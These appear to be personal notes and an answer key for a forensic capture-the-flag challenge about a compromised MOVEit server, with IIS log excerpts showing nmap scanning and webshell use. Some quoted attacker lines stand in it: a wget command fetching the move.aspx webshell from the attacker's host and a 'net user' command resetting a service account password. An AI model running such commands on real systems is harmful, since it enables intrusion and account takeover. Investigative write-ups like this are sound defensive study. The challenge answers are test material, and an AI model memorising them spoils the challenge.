# Questions
- Name of the ASPX webshell uploaded by the attacker?
	- move.aspx
- What was the attacker's IP address?
	- 10.255.254.3
- What user agent was used to perform the initial attack?
	- Ruby
- When was the ASPX webshell uploaded by the attacker?
	- 12/07/2023 11:24:30
- The attacker uploaded an ASP webshell which didn't work, what is its filesize in bytes?
	- 1362
- Which tool did the attacker use to initially enumerate the vulnerable server?
	- nmap
- We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC)
	- 12/07/2023 11:09:27
- Which protocol did the attacker utilize to remote into the compromised machine?
	- rdp
- Please confirm the date and time the attacker remotely accessed the compromised machine?
	- 12/07/2023 11:11:18
- What was the useragent that the attacker used to access the webshell?
	- Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0
- What is the inst ID of the attacker?
	- 1234
- What command was run by the attacker to retrieve the webshell?
	- wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx
- What was the string within the title header of the webshell deployed by the TA?
	- awen asp.net webshell
- What did the TA change the our moveitsvc account password to?
	- 5trongP4ssw0rd


# Notes
- After opening up the zip file, we find what is known as KAPE output, originating from a Windows Server.
- We can also see the great usage of MoveIT as well
- Finally getting towards the data, we are also facing the same MFT and Event Logs.
- To answer the first question, we can look into the IIS logs alone. 
- This can be done using the u_ex230712.log
- Looking at the bottom of the log, we are able to see that a move.aspx webshell was called upon
```
2023-07-12 11:24:43 10.10.0.25 GET /move.aspx - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 200 0 0 1179
2023-07-12 11:24:47 10.10.0.25 POST /move.aspx - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 https://moveit.htb/move.aspx 200 0 0 159
```
- Now, we move onto finding the second question, in which we need an IP address.
- We can just pull the one from the timestamp, which is 10.255.254.3
- Next, we need to find the user agent that performed this attack
- We can also find this in the log. Note, we are able to confirm this since the IP addresses both match
```
2023-07-12 10:24:52 10.10.0.25 GET / - 443 - 10.255.254.3 Ruby - 200 0 0 89
```
- Now, we need the timestamp in which it was uploaded.
- For this, we dive into the MFT file that we converted into a csv file, just like what we did before
- For that, we can dig into the MFT to find more information. Filtering it out, we find what we need.
![[Screenshot_20251202_233052.png]]
- Note, we need to answer the question using the non-American time format, so 7/12/2023 becomes: 12/07/2023 11:24:30
- Now, let's find the filesize of the webshell in bytes. We can directly pull this from the same timeline entry.
![[Screenshot_20251202_234547.png]]
- Great! Now for the next question, we are asked the tool the attacker use to enumerate the server.
- We can easily see that being nmap, especially when looking at the logs
```
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 101
2023-07-12 10:11:15 10.10.0.25 GET /nmaplowercheck1689156596 - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 128
2023-07-12 10:11:15 10.10.0.25 GET / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 302 0 0 135
2023-07-12 10:11:15 10.10.0.25 POST / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 302 0 0 156
2023-07-12 10:11:15 10.10.0.25 GET /robots.txt - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 80
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 80
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 80
2023-07-12 10:11:15 10.10.0.25 PROPFIND / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 80
2023-07-12 10:11:15 10.10.0.25 PROPFIND / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 80
2023-07-12 10:11:15 10.10.0.25 PROPFIND / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 92
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 90
2023-07-12 10:11:15 10.10.0.25 GET /evox/about - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 91
2023-07-12 10:11:15 10.10.0.25 WURP / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 104
2023-07-12 10:11:15 10.10.0.25 GET /HNAP1 - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 98
2023-07-12 10:11:15 10.10.0.25 POST /sdk - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 77
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 89
2023-07-12 10:11:15 10.10.0.25 POST / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 160
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 212
2023-07-12 10:11:15 127.0.0.1 POST /machine.aspx - 80 - 127.0.0.1 - - 200 0 0 392
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 76
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 75
```
- Now, we need to find the timestamp to see when the service account's password was changed. We can pull from the same timeline, in which we get 12/07/2023 11:09:27
- Next, we need to give the protocol the attacker used. We can confirm the usage of RDP from this.
![[Screenshot_20251203_000317.png]]
- We can then find the timestamp from the same entries, which comes out to 12/07/2023 11:11:18. Remember: we need to use non-American time formats
- We then need the useragent, which we have pulled before from the logs
```
Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0
```
- Next, we need to find the ID. We can do this by going into the MoveIT SQL records, in which we can find what we need, which is 1234
![[Screenshot_20251203_000629.png]]
- Next, we are asked the command the attacker used to get the shell onto the machine
- We can pull this information from the .vmem file, in which we get: wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx
- Seems reasonable
- Next, we need the heder from that webshell, which we can pull easily:
	- awen asp.net webshell
- Finally, we need the password of the account. We acn find this within the vmem file, specifically on this line
```
net user "moveitsvc" 5trongP4ssw0rd
```
- Crazy how it's in plaintext, but there it is!